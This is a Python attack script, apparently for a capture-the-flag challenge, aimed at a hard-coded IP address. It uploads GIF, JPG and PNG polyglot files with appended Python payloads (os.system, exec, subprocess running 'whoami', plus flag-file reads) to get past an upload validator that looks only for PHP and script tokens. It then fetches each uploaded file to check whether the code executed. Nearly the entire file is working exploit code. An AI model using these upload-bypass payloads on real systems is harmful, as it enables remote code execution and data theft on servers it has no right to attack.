import requests
import re

requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
TIMEOUT = 15

session = requests.Session()
session.verify = False
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
})
session.proxies = {}


def print_section(title):
    print("\n" + "=" * 70)
    print(f"  {title}")
    print("=" * 70)


def test_gif_python_upload():
    """测试上传包含Python代码的GIF文件"""
    print_section("1. 测试上传包含Python代码的GIF文件")
    
    url = f"{TARGET}/upload"
    
    r = session.get(url, timeout=TIMEOUT)
    csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
    csrf_token = csrf.group(1) if csrf else ""
    
    # GIF格式：以GIF89a开头，以;结尾
    # validate_image_payload检查危险令牌：<?php, <script, <%
    # 不检查Python代码！
    
    # 创建一个有效的GIF文件，包含Python代码
    # GIF格式：GIF89a + 宽度 + 高度 + 全局颜色表 + 图像数据 + 结束符(;)
    
    # 最小有效GIF
    gif_header = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00"
    
    # 测试各种Python代码格式
    python_payloads = [
        # 标准Python代码（不使用#!开头）
        b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00;import os;os.system("whoami")',
        b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00;exec("import os;print(os.system(\'whoami\'))")',
        b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00;__import__("os").system("whoami")',
        b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00;import subprocess;subprocess.call("whoami",shell=True)',
        b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00;import os;print(os.popen("type F:\\\\flag.txt").read())',
        # 尝试使用不同的编码
        b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00;__import__(\x22os\x22).system(\x22whoami\x22)',
        # 尝试读取flag
        b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00;import os;f=open("F:\\\\small peoject\\\\python-lab\\\\flag.txt","r");print(f.read())',
    ]
    
    for i, payload in enumerate(python_payloads):
        filename = f"test_python_{i}.gif"
        try:
            files = {"file": (filename, payload, "image/gif")}
            r = session.post(url, files=files, data={"csrf": csrf_token}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                if "上传成功" in r.text:
                    uploaded_name = re.search(r'/uploads/([^"]+)', r.text)
                    if uploaded_name:
                        print(f"\n  🎉 上传成功: {filename} -> /uploads/{uploaded_name.group(1)}")
                        
                        # 测试文件是否被执行
                        r2 = session.get(f"{TARGET}/uploads/{uploaded_name.group(1)}", timeout=TIMEOUT)
                        print(f"     Content-Type: {r2.headers.get('Content-Type', '')}")
                        print(f"     内容: {r2.text[:500]}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', r2.text, re.IGNORECASE)
                        if flag_match:
                            print(f"     🚩 FLAG: {flag_match.group(0)}")
                            return
                else:
                    notice = re.search(r'<p class="notice">(.*?)</p>', r.text)
                    if notice:
                        print(f"\n  ❌ {filename}: {notice.group(1)}")
                        
        except Exception as e:
            print(f"  错误: {e}")


def test_jpg_python_upload():
    """测试上传包含Python代码的JPG文件"""
    print_section("2. 测试上传包含Python代码的JPG文件")
    
    url = f"{TARGET}/upload"
    
    r = session.get(url, timeout=TIMEOUT)
    csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
    csrf_token = csrf.group(1) if csrf else ""
    
    # JPG格式：以FFD8开头，以FFD9结尾
    jpg_header = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xdb\x00\x43\x00\x03\x02\x02\x02\x02\x02\x03\x02\x02\x02\x03\x03\x03\x03\x04\x06\x04\x04\x04\x04\x04\x08\x06\x06\x05\x06\x09\x08\x0a\x0a\x09\x08\x09\x09\x0a\x0c\x0f\x0c\x0a\x0b\x0e\x0b\x09\x09"
    jpg_footer = b"\xff\xd9"
    
    python_payloads = [
        jpg_header + b"import os;os.system('whoami')" + jpg_footer,
        jpg_header + b"exec('import os;print(os.system(\"whoami\"))')" + jpg_footer,
        jpg_header + b"__import__('os').system('whoami')" + jpg_footer,
    ]
    
    for i, payload in enumerate(python_payloads):
        filename = f"test_python_{i}.jpg"
        try:
            files = {"file": (filename, payload, "image/jpeg")}
            r = session.post(url, files=files, data={"csrf": csrf_token}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                if "上传成功" in r.text:
                    uploaded_name = re.search(r'/uploads/([^"]+)', r.text)
                    if uploaded_name:
                        print(f"\n  🎉 上传成功: {filename} -> /uploads/{uploaded_name.group(1)}")
                        
                        r2 = session.get(f"{TARGET}/uploads/{uploaded_name.group(1)}", timeout=TIMEOUT)
                        print(f"     Content-Type: {r2.headers.get('Content-Type', '')}")
                        print(f"     内容: {r2.text[:500]}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', r2.text, re.IGNORECASE)
                        if flag_match:
                            print(f"     🚩 FLAG: {flag_match.group(0)}")
                            return
                else:
                    notice = re.search(r'<p class="notice">(.*?)</p>', r.text)
                    if notice:
                        print(f"\n  ❌ {filename}: {notice.group(1)}")
                        
        except Exception as e:
            print(f"  错误: {e}")


def test_png_python_upload():
    """测试上传包含Python代码的PNG文件"""
    print_section("3. 测试上传包含Python代码的PNG文件")
    
    url = f"{TARGET}/upload"
    
    r = session.get(url, timeout=TIMEOUT)
    csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
    csrf_token = csrf.group(1) if csrf else ""
    
    # PNG格式：以PNG开头，以IEND结尾
    png_header = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\x0dIDATx\x9c\xed\xc1\x01\x01\x00\x00\x00\xc2\xa0\xa0\xd4\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x01\x00\x00\x00\x01\x00\x01\x00\x00"
    png_footer = b"\x00\x00\x00\x00IEND\xaeB`\x82"
    
    python_payloads = [
        png_header + b"import os;os.system('whoami')" + png_footer,
        png_header + b"exec('import os;print(os.system(\"whoami\"))')" + png_footer,
    ]
    
    for i, payload in enumerate(python_payloads):
        filename = f"test_python_{i}.png"
        try:
            files = {"file": (filename, payload, "image/png")}
            r = session.post(url, files=files, data={"csrf": csrf_token}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                if "上传成功" in r.text:
                    uploaded_name = re.search(r'/uploads/([^"]+)', r.text)
                    if uploaded_name:
                        print(f"\n  🎉 上传成功: {filename} -> /uploads/{uploaded_name.group(1)}")
                        
                        r2 = session.get(f"{TARGET}/uploads/{uploaded_name.group(1)}", timeout=TIMEOUT)
                        print(f"     Content-Type: {r2.headers.get('Content-Type', '')}")
                        print(f"     内容: {r2.text[:500]}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', r2.text, re.IGNORECASE)
                        if flag_match:
                            print(f"     🚩 FLAG: {flag_match.group(0)}")
                            return
                else:
                    notice = re.search(r'<p class="notice">(.*?)</p>', r.text)
                    if notice:
                        print(f"\n  ❌ {filename}: {notice.group(1)}")
                        
        except Exception as e:
            print(f"  错误: {e}")


def main():
    print("*" * 70)
    print("  CTF Python代码上传测试")
    print("  目标: " + TARGET)
    print("*" * 70)
    
    test_gif_python_upload()
    test_jpg_python_upload()
    test_png_python_upload()
    
    print_section("测试完成")


if __name__ == "__main__":
    main()